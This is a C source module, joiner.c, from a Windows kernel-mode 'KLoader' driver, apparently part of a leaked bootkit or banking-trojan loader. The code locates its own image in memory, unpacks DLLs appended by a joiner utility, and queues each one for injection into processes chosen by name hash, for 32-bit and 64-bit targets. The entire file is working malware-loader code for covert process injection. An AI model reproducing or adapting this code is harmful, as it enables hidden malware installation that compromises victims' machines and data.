//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project Version 2.9.2
//	
// module: joiner.c
// $Revision: 81 $
// $Date: 2012-07-17 16:37:20 +0400 (Вт, 17 июл 2012) $
// description:
//	Support for files attached to the current image by FJ joiner utility.

#include <ntddk.h>
#include <ntimage.h>
#include "ntddkex.h"
#include "kdbg.h"
#include "kloader.h"

#include "bklib.h"
#include "joiner.h"

//
//	Returns current image base.
//
PVOID	GetCurrentImageBase(VOID)
{
	PUSHORT	Position = (PUSHORT)((ULONG_PTR)&GetCurrentImageBase & (ULONG_PTR)~0xfff);

	while (*Position != IMAGE_DOS_SIGNATURE)
		Position -= 0x1000 / sizeof(USHORT);

	return((PVOID)Position);
}


//
//	Enumerates attached files, unpacks proper ones, and fills INJECT_DESCRIPTORs array.
//
VOID	InitializeAddons(VOID)
{
	PIMAGE_DOS_HEADER	LoaderBase = (PIMAGE_DOS_HEADER)BkImageBase;
	PADDON_DESCRIPTOR	AdDesc;

	if (!LoaderBase)
		LoaderBase = (PIMAGE_DOS_HEADER)GetCurrentImageBase();

	AdDesc = FirstAddonDescriptor(LoaderBase);

	while (AdDesc->Magic != 0 && AdDesc->Magic != ADDON_MAGIC)
		AdDesc += 1;

	while (AdDesc->Magic == ADDON_MAGIC)
	{
		PCHAR	Unpacked;
		ULONG	i;

		// Processing DLL-type entries only
		if (AdDesc->Flags & PE_FLAG_DLL)
		{
			if (Unpacked = MyAllocatePool(PagedPool, AdDesc->ImageSize))
			{
				if (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)
				{
					PINJECT_DESCRIPTOR	InjDesc;
					
					for (i=0; i<AdDesc->NumberHashes; i++)
					{					
						ULONG	Flags = 0;

						if (AdDesc->Flags & PE_FLAG_X64)
							Flags |= INJECT_AMD64_PROCESS;

						if (InjDesc = AllocateInjectDescriptor(AdDesc->Hash[i], AdDesc->ImageId, Unpacked, ATTACH_COUNT_MAX, Flags))
							InsertInjectDescriptor(InjDesc);
					}	//	for (i=0; i<AdDesc->NumberHashes; i++)
				}	// if (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)
				else
					MyFreePool(Unpacked);
			}	// if (Unpacked = MyAllocatePool(PagedPool, PackedHeader->OriginalSize))
		}	// if (AdDesc->Flags & TARGET_FLAG_DLL)
		AdDesc = NextAddonDescriptor(AdDesc);
	}	// while (AdDesc->Magic == ADDON_MAGIC)
}
